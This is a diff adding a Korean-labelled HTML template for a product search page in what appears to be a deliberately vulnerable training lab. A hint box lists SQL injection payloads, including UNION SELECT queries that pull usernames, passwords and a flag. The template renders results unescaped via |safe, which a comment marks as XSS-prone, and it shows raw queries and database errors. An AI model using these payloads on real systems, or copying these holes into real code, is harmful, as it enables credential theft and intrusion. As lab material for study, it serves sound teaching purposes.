@@ -1,0 +1,49 @@
+{% extends "base.html" %}
+{% block title %}— 상품 검색{% endblock %}
+{% block content %}
+<div class="card">
+  <div class="card-title">상품 검색 <span class="vuln-badge">SQL Injection</span></div>
+  <div class="hint">
+    테스트 페이로드 (ID 파라미터):<br>
+    • <code>/products?id=1</code> → 정상 조회<br>
+    • <code>/products?id=1 OR 1=1</code> → 전체 상품 노출<br>
+    • <code>/products?id=0 UNION SELECT 1,username,password,4 FROM users--</code> → 계정 정보 탈취<br>
+    • <code>/products?id=0 UNION SELECT 1,flag,3,4 FROM secret_flags--</code> → 플래그 탈취<br><br>
+    테스트 페이로드 (검색 파라미터):<br>
+    • <code>/products?search=' OR '1'='1</code> → 전체 목록<br>
+    • <code>/products?search=%' UNION SELECT 1,username,password,4 FROM users--</code>
+  </div>
+
+  <form method="GET" style="display:flex;gap:10px;margin-bottom:16px;">
+    <input type="text" name="search" placeholder="상품명 검색..." value="{{ search }}" style="flex:1;">
+    <input type="text" name="id" placeholder="ID 직접 조회" style="width:160px;">
+    <button type="submit" class="btn">검색</button>
+  </form>
+
+  {% if error %}
+  <div class="alert alert-err">DB 오류 (스택트레이스 노출): {{ error }}</div>
+  {% endif %}
+
+  {% if query %}
+  <div class="output err">실행 쿼리 (취약: 노출됨):
+{{ query }}</div>
+  {% endif %}
+
+  {% if results %}
+  <table style="margin-top:14px;">
+    <tr><th>ID</th><th>이름</th><th>설명</th><th>가격</th></tr>
+    {% for r in results %}
+    <tr>
+      <td>{{ r[0] }}</td>
+      <!-- 취약: |safe 필터로 XSS 가능 -->
+      <td>{{ r[1] | safe }}</td>
+      <td>{{ r[2] | safe }}</td>
+      <td>{{ r[3] | safe }}</td>
+    </tr>
+    {% endfor %}
+  </table>
+  {% else %}
+  <div style="color:var(--muted);font-size:12px;margin-top:10px;">검색 결과 없음</div>
+  {% endif %}
+</div>
+{% endblock %}
